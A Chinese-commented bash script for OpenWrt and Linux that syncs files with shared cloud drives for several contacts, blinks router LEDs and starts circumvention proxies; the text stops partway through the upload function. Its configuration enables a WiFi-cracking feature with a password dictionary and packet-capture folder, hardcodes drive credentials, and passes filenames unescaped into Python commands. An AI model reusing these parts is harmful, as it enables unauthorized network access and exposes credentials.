#!/bin/bash
printf '\e[8;29;90t' # 放大终端
#==============================
# |      路由器 LED 闪烁规则（仅限 OpenWrt 系统）            |
# |--------------------|-------------------------------------|
# | 网络连接失败       | 红灯闪烁 7 次                       | 
# |--------------------|-------------------------------------|
# | 文件下载/上传个数  | 蓝灯闪烁 n 次                       |
# | 文件下载/上传成功  | 绿灯闪烁 3 次                       |
# | 文件下载/上传失败  | 红灯闪烁 3 次                       |
# |--------------------|-------------------------------------|
# | 全部流程操作完成   | 蓝灯闪烁 7 次                       | 
# =============================


# ===================配置区域 开始===================

# 下载视频使用的域名列表
video_domains=("www.xxxx.v6.navy" "www.xxxx.dns.navy" "www.xxxx.dns.army" "www.xxxx.dns.navy")

# 操作模式
# delete_download（删除下载文件）、delete_upload（删除上传文件）、none（不删除）
select_mode="delete_download"

# 网盘版本: 
# GDindex 网盘填写"gdindex" 支持旧版 WebDAV 格式的 API
# FDindex 网盘填写"fdindex" 支持新版 JSON 格式的 API
drive_version="fdindex"

# 联系人配置（可设置多个，用空格分隔，如: contacts=(A B C)）
contacts=(A B)

# 联系人1 - 测试
declare -A contact_A=(
    [name]="测试"
    [upload_link]="https://www.xxxx.dynv6.net/F/"
    [download_link]="https://www.xxxxxxxxxxx.dynv6.net/S/"
    [username]="54fmkc7gat9a"
    [password]="y623czx6hb7r"
)

# 联系人2
declare -A contact_B=(
    [name]="MT"
    [upload_link]="https://www.xxxx.dynv6.net/A/"
    [download_link]="https://www.xxxxx.dynv6.net/B/"
    [username]="xxx"
    [password]="xxx"
)


# 几个人共用这个链接
total_users=2

# 自己的代号，回复OK时标记为"QOK"
mark_myself=Q

# 是否下载视频，下载视频填写true，不下载留空
down_video=

# linux系统是否默认使用无界代理，填写true默认使用无界，留空自己选择代理
default_wj_proxy=true

# ============ WiFi破解配置（仅OpenWrt）============
# 是否启用WiFi破解功能
enable_wifi_crack=true
# ===================配置区域 结束===================



# ===================================
# 函数库部分
# 包含所有功能函数，如日志、LED控制、下载、上传等
# ===================================

# 进度条函数----------------------------------------------------------未启用函数
# 用法: echo "45" | progress_bar "下载进度"
function progress_bar() {
    local label="$1"
    local percentage
    read percentage
    percentage=$(echo "$percentage" | tr -d ' %')  # 移除空格和%
    
    # 计算进度条宽度
    local bar_width=50
    local filled=$((percentage * bar_width / 100))
    local empty=$((bar_width - filled))
    
    # 生成进度条
    local bar=""
    for ((i=0; i<filled; i++)); do bar+=">"; done
    for ((i=0; i<empty; i++)); do bar+="-"; done
    
    # 输出进度条（覆盖同一行）
    printf "\r\033[1;36m[%s]\033[0m \033[1;32m[%s]\033[0m \033[1;33m%5.2f%%\033[0m" "$label" "$bar" "$percentage"
    
    # 如果完成，换行
    if [ "$percentage" -ge 100 ]; then
        echo ""
    fi
}

# 格式化文件大小
function format_size() {
    local size=$1
    if [ $size -ge 1073741824 ]; then
        echo "$(echo "scale=2; $size/1073741824" | bc) GB"
    elif [ $size -ge 1048576 ]; then
        echo "$(echo "scale=2; $size/1048576" | bc) MB"
    elif [ $size -ge 1024 ]; then
        echo "$(echo "scale=2; $size/1024" | bc) KB"
    else
        echo "$size B"
    fi
}

# ----↓以下变量一般不需要修改，可保持默认↓----
# 自动检测到脚本所在目录（支持U盘挂载）
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# WiFi破解配置（仅OpenWrt）
wifi_password_file="${SCRIPT_DIR}/data/wifi密码字典.txt"
wifi_cracked_file="${SCRIPT_DIR}/data/wifi密码.txt"
wifi_capture_dir="${SCRIPT_DIR}/data/抓的包"

# 匹配OK标记的正则表达式
mark_ok="_${mark_myself}OK_|OK|mp3ok|mp3OK|ok\.mp3|OK\.mp3"

# 文件夹路径（基于脚本目录）
log_dir="${SCRIPT_DIR}/data/日志"
wifi_sec="${SCRIPT_DIR}/data/wifi密码.txt"
video_path="${SCRIPT_DIR}/收"
data_dir="${SCRIPT_DIR}/data"

# 根据联系人数量决定路径结构
# 联系人：收/ 发/
# 多个联系人：收/1/ 收/2/ 发/1/ 发/2/
contact_count=${#contacts[@]}
if [ "$contact_count" -eq 1 ]; then
    download_path="${SCRIPT_DIR}/收"
    upload_path="${SCRIPT_DIR}/发"
else
    download_path="${SCRIPT_DIR}/收/${contacts[0]}"
    upload_path="${SCRIPT_DIR}/发/${contacts[0]}"
fi

# 日志文件路径
log_file="$log_dir/$(date +%y%m%d).log"
    
# 定义颜灯闪烁常量
red='\033[1;31m'     # 红灯闪烁粗体
green='\033[1;32m'   # 绿灯闪烁粗体
yellow='\033[1;33m'  # 黄灯闪烁粗体
cyan='\033[1;36m'    # 青灯闪烁粗体
reset='\033[0m'      # 重置颜灯闪烁

# 仅保留近几天内的本地日志
keep_log_days=7

# 路由器　LED 灯的配置路径
led_path="/sys/class/leds/"

# 设置 UTF-8 编码以支持中文路径
export LANG=C.UTF-8
# ===================================

# 自动删除N天以前的日志文件
find "$log_dir" -type f -name "*.log" -mtime +$keep_log_days -delete 2>/dev/null
    
# 日志输出函数
# 参数: $1 - 颜灯闪烁 (red, yellow, green, cyan), $2 - 消息, $3 - 是否不换行 (true/false)
function log_message() {
    local color=$1
    local message=$2
    local no_newline=$3 # true 表示不换行
    # 如果 log 文件夹不存在，则创建
    [ ! -d "$log_dir" ] && mkdir -p "$log_dir"

    # 根据颜灯闪烁类型选择颜灯闪烁
    case $color in
        red)
            color_code=$red
            ;;
        yellow)
            color_code=$yellow
            ;;
        green)
            color_code=$green
            ;;
        cyan)
            color_code='\033[1;36m'
            ;;
        *)
            color_code=''
            ;;
    esac

    # 终端和日志输出
    if [[ "$no_newline" == "true" ]]; then
        echo -ne "${color_code}${message}${reset}"
        printf "[%s] %s\r\n" "$(date +'%Y-%m-%d %H:%M:%S')" "$message" >> "$log_file"
    else
        echo -e "${color_code}${message}${reset}"
        printf "[%s] %s\r\n" "$(date +'%Y-%m-%d %H:%M:%S')" "$message" >> "$log_file"
    fi

}


# 查找指定颜灯闪烁的 LED，参数: $1 - 颜灯闪烁（如 green、red、blue）
# 返回: LED 名称，或空字符串（如果未找到）
function find_led() {
    local color=$1
    local led
    led=$(ls "$led_path" 2>/dev/null | grep -i "$color" | head -n 1)
    if [ -z "$led" ]; then
        log_message yellow "未找到包含 $color 的 LED"
        return 1
    fi
    echo "$led"
}

# 设置 LED 状态
# 参数: $1 - LED 名称, $2 - 状态 (0=关闭, 1=开启)
function set_led() {
    local led=$1
    local state=$2
    echo $state > "$led_path$led/brightness" 2>/dev/null || log_message yellow "无法设置 $led 状态"
}

# 通用路由器 LED 闪烁函数，参数: $1 - 颜灯闪烁, $2 - 闪烁次数, $3 - 是否保持点亮（0=不保持，1=保持）
function blink_led() {
    local color=$1
    local count=$2
    local keep_on=${3:-1}  # 默认保持点亮
    if [ -f /etc/openwrt_release ] || uname -a | grep -q "OpenWrt"; then
        local led
        led=$(find_led "$color") || return 1
        if [ ! -f "$led_path$led/brightness" ]; then
            log_message yellow "未找到 $color LED 的亮度控制文件"
            return 1
        fi
        echo none > "$led_path$led/trigger" 2>/dev/null || return 1
        log_message "$color" "路由器 $color LED灯闪烁 $count 次"
        for ((i=1; i<=count; i++)); do
            set_led "$led" 1
            sleep 1
            set_led "$led" 0
            sleep 1
        done
        if [ "$keep_on" -eq 1 ]; then
            led=$(find_led "green") || return 1
            set_led "$led" 1
        fi
    fi
}

function sync_system_time() {
    local ntp_servers=("ntp.nict.jp" "jp.pool.ntp.org" "sg.pool.ntp.org" "kr.pool.ntp.org")

    for server in "${ntp_servers[@]}"; do
        if ntpdate -u "$server" >/dev/null 2>&1; then
            log_message green "当前 OpenWrt 系统，与 $server 同步时间成功。"
            return 0
        else
            log_message yellow "当前 OpenWrt 系统，与 $server 同步时间失败。"
        fi
    done

    log_message red "所有 NTP 服务器同步失败，日志日期可能错误"
    return 1
}

function set_system_proxy() {
  # 设置终端变量
  if [[ "$DESKTOP_SESSION" == "xfce" ]]; then
      terminal_command="xfce4-terminal"
  else # 默认终端
      terminal_command="gnome-terminal"
  fi
  
    # 判断无界路径
    if ls /home/software/U/u* >/dev/null 2>&1; then
      wujie_path=$(ls /home/software/U/u* 2>/dev/null)
    elif ls /home/software/simproxy/proxy/u/u* >/dev/null 2>&1; then
      wujie_path=$(ls /home/software/simproxy/proxy/u/u* 2>/dev/null)
    elif ls /home/software/u/u* >/dev/null 2>&1; then
      wujie_path=$(ls /home/software/u/u* 2>/dev/null)
    elif which u2126 >/dev/null 2>&1; then
      wujie_path=$(which u2126)
    fi

  # 无界文件名
  wujie_core=${wujie_path##*/}

  # 自动选择无界代理
  if [[ "$default_wj_proxy" == "true" ]]; then
    export all_proxy=http://127.0.0.1:8580
    export http_proxy=http://127.0.0.1:8580
    export https_proxy=http://127.0.0.1:8580

    # 检查无界是否正在运行
    if ! pgrep -x "$wujie_core" > /dev/null; then
      auto_connect_wj=ok
      upstream_ip_port=$(cat /home/software/tor-browser/Browser/TorBrowser/Data/Browser/profile.default/user.js | grep -e 'user_pref("torbrowser.settings.proxy.address"' -e 'user_pref("torbrowser.settings.proxy.port"' | awk -F ',' '{print $2}' | xargs -n 1 | awk -F ')' '{print $1}' | xargs -n 2 | awk '{print $1":"$2}')

      # 切换到临时目录运行无界，避免当前目录生成临时文件
      local current_dir=$(pwd)
      cd /tmp
      $terminal_command --title="关闭此窗口会直接关闭无界" --geometry=36x6+1+3 -- bash -c "$wujie_path -p ${upstream_ip_port} -l :8580"
      cd "$current_dir"
    fi

    return 0  # 提前结束函数
  fi


  # 手动选择网络代理
  setProxy=$(zenity --forms --title "选择代理" --text="请选择后置代理，选择后自动开启代理" --separator=","   --width='520' --height='60' \
    --extra-button="QV2代理
  端口:8889" \
    --extra-button="无界代理
  端口:8580" \
    --extra-button="赛风代理
  端口:8580" \
    --extra-button="B机直连
  B机:8118" \
   --cancel-label="退出" --ok-label="TOR代理
  端口:9080" )
  if [ "$?" = "0" ] ;then
      export all_proxy=http://127.0.0.1:9080
      export http_proxy=http://127.0.0.1:9080
      export https_proxy=http://127.0.0.1:9080
      # 检查 tor 是否正在运行
      if ! pgrep -x "firefox.real" > /dev/null; then
        # 标记自动启动
        auto_connect_tor=ok
        # 如果没有运行，则启动 tor，带上指定参数
        /home/software/tor-browser/Browser/start-tor-browser&
        sleep 10
      fi
    else
      echo "$setProxy" | grep -q "QV2代理" && {
      export all_proxy=http://127.0.0.1:8889
      export http_proxy=http://127.0.0.1:8889
      export https_proxy=http://127.0.0.1:8889
      # 检查 xray 是否正在运行
      if ! pgrep -x "xray" > /dev/null; then
        # 标记自动启动
        auto_connect_xray=ok
        # 如果没有运行，则启动 xray，带上指定参数
        sudo /home/software/tor-browser/Browser/TorBrowser/Data/Tor/torrc_ctl.sh auto_connect_us &  >/dev/null
        sleep 5
      fi
    }
    echo "$setProxy" | grep -q "无界代理" && {
      export all_proxy=http://127.0.0.1:8580
      export http_proxy=http://127.0.0.1:8580
      export https_proxy=http://127.0.0.1:8580
      # 检查无界是否正在运行
      if ! pgrep -x "$wujie_core" > /dev/null; then
        # 标记自动启动
        auto_connect_wj=ok
        # 如果没有运行，则启动无界，带上指定参数
        torrc_userJson=$(cat /home/software/tor-browser/Browser/TorBrowser/Data/Browser/profile.default/user.js |grep -e 'user_pref("torbrowser.settings.proxy.address"' -e 'user_pref("torbrowser.settings.proxy.port"' |awk -F ',' '{print $2}' |xargs -n 1 |awk -F ')' '{print $1}' |xargs -n 2 |awk '{print $1":"$2}')
        
        # 切换到临时目录运行无界，避免当前目录生成临时文件
        local current_dir=$(pwd)
        cd /tmp
        $terminal_command --title="关闭此窗口会直接关闭无界" --geometry=36x6+1+1 -- bash -c "$wujie_path -p ${torrc_userJson} -l :8580"
        cd "$current_dir"

        sleep 5
      fi
    }
    echo "$setProxy" | grep -q "赛风代理" && {
      export all_proxy=http://127.0.0.1:8580
      export http_proxy=http://127.0.0.1:8580
      export https_proxy=http://127.0.0.1:8580
      # 检查 psiphonGUI 是否正在运行
      if ! pgrep -x "psiphonGUI" > /dev/null; then
        # 标记自动启动
        auto_connect_sf=ok
        # 如果没有运行，则启动 psiphonGUI，带上指定参数
        /home/software/psiphonGUI/psiphonGUI &
        sleep 5
      fi
    }
    echo "$setProxy" | grep -q "B机直连" && {
      b_ip=$(test -e ~/.bip && cat ~/.bip || zenity --entry --title "请输入B机IP" --text "未找到B机IP，请输入：")
      if ! [[ "$b_ip" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        log_message red "无效的 IP 地址：$b_ip"
        b_ip=$(test -e ~/.bip && cat ~/.bip || zenity --entry --title "请输入B机IP" --text "未找到B机IP，请输入：")
      fi
      echo "$b_ip" > ~/.bip
      export all_proxy=http://$b_ip:8118
      export http_proxy=http://$b_ip:8118
      export https_proxy=http://$b_ip:8118
    }

    if [ "$setProxy" = "" ] ;then
      exit
    fi
    
  fi
}


# 函数：将当前窗口移动到屏幕中间
center_window() {
    if ! command -v wmctrl &> /dev/null; then     # 检查 wmctrl 是否安装
        log_message yellow "错误：wmctrl 未安装，请安装 wmctrl（例如：sudo apt install wmctrl）"
        return 1
    fi

    # 获取屏幕分辨率
    read screen_width screen_height <<< $(wmctrl -d | grep '*' | awk '{print $4}' | tr 'x' ' '| awk '{print $1, $2}')

    # 获取当前窗口 ID
    sleep 0.5
    window_id=$(xprop -root _NET_ACTIVE_WINDOW | grep -o '0x[0-9a-fA-F]\+' | head -n1)

    # 获取当前窗口宽高
    read window_width window_height <<< $(wmctrl -lG | grep -E "0x0*${window_id#0x}" | awk '{print $5, $6}')

    # 计算窗口移动到的位置（屏幕中心）
    new_x=$(( (screen_width - window_width) / 2 ))
    new_y=$(( (screen_height - window_height) / 2 ))

    # 确保坐标不为负值
    new_x=$(( new_x < 0 ? 0 : new_x ))
    new_y=$(( new_y < 0 ? 0 : new_y ))

    # 使用 wmctrl 移动脚本所在窗口
    wmctrl -i -r "$window_id" -e "0,$new_x,$new_y,-1,-1"
    if [ $? -ne 0 ]; then
            log_message yellow "错误：无法移动窗口，请确保窗口存在且 wmctrl 支持你的窗口管理器"
            return 1
    fi
}


# ------------------- 同步时间 或 设置代理和窗口居中 -------------------
function set_time_or_proxy () {
    if [ -f /etc/openwrt_release ] || uname -a | grep -q "OpenWrt"; then
        clear
        log_message green ""
        log_message green "=============================="
        sync_system_time # 校准时间，避免日志时间错误

    else
        center_window    # 终端居中
        set_system_proxy # ADV机走代理
        clear
        log_message green ""
        log_message green "=============================="
    fi
}

# ------------------- 网络检查函数 -------------------
function check_net_status() {
    local max_retries=5
    local retry_count=0
    log_message green "********************* 正在检测到联网情况 **********************"
    sleep 1

    while (( retry_count < max_retries )); do
        local net_status_ubuntu=$(curl -A "Mozilla/5.0" -I -s --connect-timeout 5 archive.ubuntu.com -w %{http_code} | tail -n1)
        local net_status_cloudflare=$(curl -A "Mozilla/5.0" -I -s --connect-timeout 5 www.cloudflare.com -w %{http_code} | tail -n1)

        if { [[ $net_status_ubuntu -ge 200 && $net_status_ubuntu -le 499 ]] || \
             [[ $net_status_cloudflare -ge 200 && $net_status_cloudflare -le 499 ]]; }; then
            log_message green "********************* 检测到联网情况正常 **********************"
            return 0
        else
            log_message red "**** 没有网络，请检查网络连接或代理设置 (尝试 $((retry_count + 1))/$max_retries) ****"

            # 判断是否是 OpenWrt 系统
            if [ -f /etc/openwrt_release ] || uname -a | grep -q "OpenWrt"; then
                log_message yellow "********************* 重启 OpenWrt 网卡 *********************"
                ifdown -a
                sleep 2
                ifup -a
                sleep 5
            fi

            ((retry_count++))
            sleep 3
        fi
    done

    # 重试失败后不关机，返回失败状态由主流程处理
    log_message red "******** 尝试 $max_retries 次后联网仍然失败 ********"
    log_message green "============================="
    return 1
}


# ------------------- 变量验证 -------------------
function check_variables() {
    # 验证联系人配置
    for contact_id in "${contacts[@]}"; do
        local arr_name="contact_${contact_id}"
        local -n ul="${arr_name}[upload_link]"
        local -n dl="${arr_name}[download_link]"
        local -n un="${arr_name}[username]"
        local -n pw="${arr_name}[password]"
        local -n nm="${arr_name}[name]"
        
        if [[ -z "$ul" ]]; then
            log_message red "错误：联系人 $contact_id ($nm) 的 upload_link 不能为空"
            sleep 3
            exit 1
        fi
        if [[ -z "$dl" ]]; then
            log_message red "错误：联系人 $contact_id ($nm) 的 download_link 不能为空"
            sleep 3
            exit 1
        fi
        if [[ -z "$un" ]]; then
            log_message red "错误：联系人 $contact_id ($nm) 的 username 不能为空"
            sleep 3
            exit 1
        fi
        if [[ -z "$pw" ]]; then
            log_message red "错误：联系人 $contact_id ($nm) 的 password 不能为空"
            sleep 3
            exit 1
        fi
        
        # 创建该联系人的目录
        if [ "$contact_count" -eq 1 ]; then
            mkdir -p "${SCRIPT_DIR}/收"
            mkdir -p "${SCRIPT_DIR}/发"
        else
            mkdir -p "${SCRIPT_DIR}/收/${contact_id}"
            mkdir -p "${SCRIPT_DIR}/发/${contact_id}"
        fi
    done
    
    for path in "$video_path"; do
        if [[ ! -d "$path" ]]; then
            log_message yellow "路径 $path 不存在，正在创建..."
            mkdir -p "$path" || { log_message red "创建路径 $path 失败"; }
        fi
    done
    case "$select_mode" in
        "delete_upload"|"delete_download"|"none")
            ;;
        *)
            log_message yellow "\e[1;31m错误：select_mode 参数：$select_mode 无效，必须为以下之一："
            log_message yellow "1. delete_upload（删除自己上传的文件）"
            log_message yellow "2. delete_download（删除自己下载的文件）"
            log_message yellow "3. none（不删除任何文件）"
            sleep 15
            exit 1
            ;;
    esac
}

# ------------------- 打乱数组元素的函数，用于随机排序域名 -------------------
shuffle_array() {
    local array=("$@")  # 获取传入的数组参数
    local n=${#array[@]}  # 获取数组长度
    local i
    # 使用Fisher-Yates洗牌算法随机打乱数组
    for ((i=n-1; i>0; i--)); do
        local j=$((RANDOM % (i+1)))  # 随机选择一个索引
        local temp=${array[i]}  # 交换当前元素和随机选中的元素
        array[i]=${array[j]}
        array[j]=$temp
    done
    echo "${array[@]}"  # 返回打乱后的数组
}

# ------------------- 测试域名的函数 -------------------
test_domains() {
    local get_domains=("$@")  # 获取传入的域名数组
    
    # 调用 shuffle_array 函数打乱域名顺序
    local shuffled=($(shuffle_array "${get_domains[@]}"))
    
    # 逐个测试打乱后的域名
    for domain in "${shuffled[@]}"; do
#        log_message green "正在测试域名: $domain" >&2  # 重定向日志到 stderr
        # 使用 curl 检查 HTTP 状态码，-s 静默，--head 只请求头部，--connect-timeout 2 设置 2 秒连接超时
        local status_code
        status_code=$(curl -s --head --connect-timeout 2 --max-time 5 -w "%{http_code}" "http://$domain" -o /dev/null 2>/dev/null)
        if [[ -n "$status_code" && "$status_code" -ge 200 && "$status_code" -le 499 ]]; then
#            log_message green "成功: $domain 可访问 (状态码: $status_code)" >&2  # 重定向日志到 stderr
            echo "$domain"  # 只输出域名到 stdout
            return 0  # 返回 0 表示成功
        else
            log_message red "失败: $domain 不可访问 (状态码: $status_code 或连接失败)" >&2  # 重定向日志到 stderr
        fi
    done
    
    log_message red "所有域名测试失败" >&2  # 重定向日志到 stderr
    return 1  # 返回 1 表示失败
}

# ------------------- 下载联系人的文件 -------------------
function download_files_for_contact() {
    local contact_id="$1"
    local contact_name="${2:-未知}"
    
    # 获取该联系人的配置
    local arr_name="contact_${contact_id}"
    local -n ul="${arr_name}[upload_link]"
    local -n dl="${arr_name}[download_link]"
    local -n user="${arr_name}[username]"
    local -n pass="${arr_name}[password]"
    
    # 确定该联系人的下载路径
    local dl_path
    if [ "$contact_count" -eq 1 ]; then
        dl_path="${SCRIPT_DIR}/收"
    else
        dl_path="${SCRIPT_DIR}/收/${contact_id}"
    fi
    mkdir -p "$dl_path"
    
    log_message green "──────────── ${contact_name} ────────────"
    
    local remote_down_dir_file_list
    local remote_down_dir_file_names
    
    if [[ "$drive_version" == "fdindex" ]]; then
        remote_down_dir_file_list=$(curl -s -X POST "$dl" -u "${user}:${pass}" \
            -H "Content-Type: application/json" \
            -d "{\"action\":\"list\"}")
        
        if echo "$remote_down_dir_file_list" | grep -q '"list"'; then
            remote_down_dir_file_names=$(echo "$remote_down_dir_file_list" | grep -o '"name": *"[^"]*"' | sed 's/"name": *"\([^"]*\)"/\1/')
        else
            remote_down_dir_file_names=""
        fi
    else
        remote_down_dir_file_list=$(curl -s -X POST "$dl" -u "${user}:${pass}" -H "Content-Type: application/json" --data '')
        remote_down_dir_file_names=$(echo "$remote_down_dir_file_list" | grep -o '"name": *"[^"]*"' | sed 's/"name": *"\([^"]*\)"/\1/')
    fi
    
    if [[ -z "$remote_down_dir_file_names" ]]; then
        names_array=()
        log_message green "[收] 网盘没有文件"
        return 1
    else
        readarray -t names_array <<< "$remote_down_dir_file_names"
        total_files=${#names_array[@]}
    fi

    local filtered_file_names=""
    while IFS= read -r name; do
        if ! echo "$name" | grep -q -E "$mark_ok"; then
            filtered_file_names+="$name\n"
        fi
    done <<< "$remote_down_dir_file_names"
    filtered_file_names=$(echo -e "$filtered_file_names" | sed '/^$/d')
    
    if [[ -z "$filtered_file_names" && "$select_mode" != "none" ]]; then
        filtered_names_array=()
        filtered_files=0
    else
        if [ "$select_mode" != "none" ]; then
            readarray -t filtered_names_array <<< "$filtered_file_names"
            filtered_files=${#filtered_names_array[@]}
        else
            filtered_files=$total_files
        fi
    fi
    
    blink_led blue "$filtered_files"
    log_message green "[收] 检测到 $total_files 个，需下载 $filtered_files 个"
    
    local idx=1
    for name in "${names_array[@]}"; do
        if echo "$name" | grep -qE "$mark_ok"; then
            log_message yellow "  [$idx] $name"
        else
            log_message green "  [$idx] $name"
        fi
        ((idx++))
    done
    
    for i in "${!names_array[@]}"; do
        filename="${names_array[$i]}"
        target_file="${dl_path}/${filename}"

        if [ "$select_mode" != "none" ] && echo "${filename}" | grep -qE "$mark_ok"; then
            continue
        fi

        if [[ -f "$target_file" ]]; then
            continue
        fi
        
        encoded_filename=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$filename'))")
        download_url="${dl%/*}/${encoded_filename}"
        
        echo ""
        echo -ne "\033[1;36m[收]\033[0m \033[1;33m$filename\033[0m - "
        
        if curl -s -S -u "${user}:${pass}" \
            -o "$target_file" "$download_url" 2>/dev/null; then
            if [ -f "$target_file" ]; then
                local final_size=$(stat -c%s "$target_file" 2>/dev/null || stat -f%z "$target_file" 2>/dev/null)
                echo -e "\033[1;32m✓ 完成 ($(format_size $final_size))\033[0m"
            fi
            blink_led "green" 3 1
            
            if [ "$select_mode" != "none" ]; then
                filename_base="${filename%.*}"
                extension="${filename##*.}"
                new_name="${filename_base}_${mark_myself}OK_$(date +%Y%m%d).${extension}"
                
                rename_success=false
                if [[ "$drive_version" == "fdindex" ]]; then
                    local api_path=$(echo "$dl" | sed 's|https\?://[^/]*||')
                    encoded_source=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$filename'))")
                    rename_result=$(curl -s -u "${user}:${pass}" \
                        -X POST "$dl" \
                        -H "Content-Type: application/json" \
                        --data-raw "{\"action\":\"rename\",\"source\":\"${api_path}${encoded_source}\",\"name\":\"${new_name}\"}")
                    if echo "$rename_result" | grep -q '"count"'; then
                        rename_success=true
                    fi
                else
                    if curl -s -S -u "${user}:${pass}" -X PUT \
                        -o /dev/null \
                        "${download_url}?rename=${new_name}"; then
                        rename_success=true
                    fi
                fi
                
                if $rename_success; then
                    echo -ne "\033[1;32m[收] 回复OK\033[0m"
                    
                    if [ "$select_mode" = "delete_download" ]; then
                        mark_ok_count=$(echo "$new_name" | grep -o "$mark_ok" | wc -l)
                        
                        if [ "$mark_ok_count" -ge "$total_users" ]; then
                            if [[ "$drive_version" == "fdindex" ]]; then
                                local api_path=$(echo "$dl" | sed 's|https\?://[^/]*||')
                                encoded_source=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$new_name'))")
                                delete_result=$(curl -s -u "${user}:${pass}" \
                                    -X POST "$dl" \
                                    -H "Content-Type: application/json" \
                                    --data-raw "{\"action\":\"delete\",\"source\":\"${api_path}${encoded_source}\"}")
                                if echo "$delete_result" | grep -q '"count"'; then
                                    echo -e "\033[1;32m - $new_name 已由 $total_users 人收完，删除\033[0m"
                                fi
                            else
                                encoded_new_name=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$new_name'))")
                                if curl -s -S -u "${user}:${pass}" -X DELETE \
                                    -o /dev/null \
                                    "${dl}/${encoded_new_name}"; then
                                    echo -e "\033[1;32m - $new_name 已由 $total_users 人收完，删除\033[0m"
                                fi
                            fi
                        else
                            echo ""
                        fi
                    else
                        echo ""
                    fi
                else
                    echo ""
                fi
            else
                echo ""
            fi
        else
            echo -e "\033[1;31m✗ 失败\033[0m"
            rm -f "$target_file"
            blink_led "red" 3 1
        fi
    done
}
echo ""

# ------------------- 下载函数（遍历所有联系人）-------------------
function download_files() {
    for contact_id in "${contacts[@]}"; do
        local arr_name="contact_${contact_id}"
        local -n contact_name="${arr_name}[name]"
        download_files_for_contact "$contact_id" "$contact_name"
    done
}

# ------------------- 删除上传文件函数 -------------------
function delete_uploaded_files() {
    local remote_up_dir_file_names="$1"
    local up_link="$2"
    local user="$3"
    local pass="$4"
    readarray -t names_array <<< "$remote_up_dir_file_names"
    for i in "${!names_array[@]}"; do
        filename="${names_array[$i]}"
        if echo ${filename} | grep -qE "$mark_ok"; then
            if [[ "$drive_version" == "fdindex" ]]; then
                local api_path=$(echo "$up_link" | sed 's|https\?://[^/]*||')
                delete_result=$(curl -s -u "${user}:${pass}" \
                    -X POST "$up_link" \
                    -H "Content-Type: application/json" \
                    --data-raw "{\"action\":\"delete\",\"source\":\"${api_path}${filename}\"}")
                if echo "$delete_result" | grep -q '"count"'; then
                    log_message green "文件 ${filename} 删除成功"
                else
                    log_message red "文件 ${filename} 删除失败 (响应: $delete_result)"
                fi
            else
                if curl -s -S --fail -u "${user}:${pass}" -X DELETE \
                    -o /dev/null \
                    "${up_link}/${filename}"; then
                    log_message green "文件 ${filename} 删除成功"
                else
                    log_message red "文件 ${filename} 删除失败"
                fi
            fi
        fi
    done
}
echo ""

# ------------------- 上传联系人的文件 -------------------
function upload_files_for_contact() {
    local contact_id="$1"
    local contact_name="${2:-未知}"
    
    # 获取该联系人的配置
    local arr_name="contact_${contact_id}"
    local -n ul="${arr_name}[upload_link]"
    local -n dl="${arr_name}[download_link]"
    local -n user="${arr_name}[username]"
    local -n pass="${arr_name}[password]"
    
    # 确定该联系人的上传路径
    local up_path
    if [ "$contact_count" -eq 1 ]; then
        up_path="${SCRIPT_DIR}/发"
    else
        up_path="${SCRIPT_DIR}/发/${contact_id}"
    fi
    mkdir -p "$up_path"
    
    # 获取网盘文件列表
    local remote_up_dir_file_list
    local remote_up_dir_file_names
    
    if [[ "$drive_version" == "fdindex" ]]; then
        remote_up_dir_file_list=$(curl -s -X POST "$ul" -u "${user}:${pass}" \
            -H "Content-Type: application/json" \
            -d "{\"action\":\"list\"}")
        if echo "$remote_up_dir_file_list" | grep -q '"list"'; then
            remote_up_dir_file_names=$(echo "$remote_up_dir_file_list" | grep -o '"name": *"[^"]*"' | sed 's/"name": *"\([^"]*\)"/\1/')
        else
            remote_up_dir_file_names=""
        fi
    else
        remote_up_dir_file_list=$(curl -s -X POST "$ul" -u "${user}:${pass}" -H "Content-Type: application/json" --data '')
        remote_up_dir_file_names=$(echo "$remote_up_dir_file_list" | grep -o '"name": *"[^"]*"' | sed 's/"name": *"\([^"]*\)"/\1/')
    fi

    # 删除自己上传并回复 OK 的文件
    if [ "$select_mode" = "delete_upload" ]; then
        delete_uploaded_files "$remote_up_dir_file_names" "$ul" "$user" "$pass"
    fi

    # 筛选本地符合后缀条件的文件上传（.mp3 或 .tar 分卷）
    local upload_files=()
    for file in "${up_path}"/*; do
        if [[ -f "$file" && ( "$file" =~ \.mp3$ || "$file" =~ \.tar\.[0-9]*$ ) ]]; then
            upload_files+=("$file")
        fi
    done
    log_message yellow ""

    local total_files=${#upload_files[@]}
    if [[ $total_files -eq 0 ]]; then
        log_message green "[发] 检测到 $total_files 个"
        log_message green ""
        return 1
    fi

    blink_led blue "$total_files"
    log_message green "[发] 检测到 $total_files 个"
    
    local idx=1
    for file in "${upload_files[@]}"; do
        local filename_name=$(basename "$file")
        log_message green "  [$idx] $filename_name"
        ((idx++))
    done

    idx=1
    for file in "${upload_files[@]}"; do
        local filename_name=$(basename "$file")

        if echo "$remote_up_dir_file_names" | grep -qw "$filename_name"; then
            log_message yellow "[发] [$idx] $filename_name - 已存在，跳过"
            mkdir -p "${up_path}/重复"
            mv "$file" "${up_path}/重复"
            ((idx++))
            continue
        fi
        
        local local_file_size=$(stat -c%s "$file" 2>/dev/null || stat -f%z "$file")
        
        echo ""
        echo -ne "\033[1;36m[发]\033[0m \033[1;33m$filename_name\033[0m - "
        
        local upload_success=false
        if [[ "$drive_version" == "fdindex" ]]; then
            encoded_filename=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$filename_name'))")
            curl -s -C - --max-time 300 -u "${user}:${pass}" -X PUT \
                -H "Content-Type: application/octet-stream" \
                --upload-file "$file" "${ul}/${encoded_filename}" >/dev/null 2>&1 && upload_success=true
        else
            curl -s -C - --max-time 300 -u "${user}:${pass}" -X PUT \
                --upload-file "$file" "${ul}" >/dev/null 2>&1 && upload_success=true
        fi
        
        if $upload_success; then
            sleep 2
            
            local verify_file_list
            if [[ "$drive_version" == "fdindex" ]]; then
                verify_file_list=$(curl -s -X POST "$ul" -u "${user}:${pass}" \
                    -H "Content-Type: application/json" \
                    -d "{\"action\":\"list\"}")
            else
                verify_file_list=$(curl -s -X POST "$ul" -u "${user}:${pass}" -H "Content-Type: application/json" --data '')
            fi
            
            local remote_file_size=""
            if [[ "$drive_version" == "fdindex" ]]; then
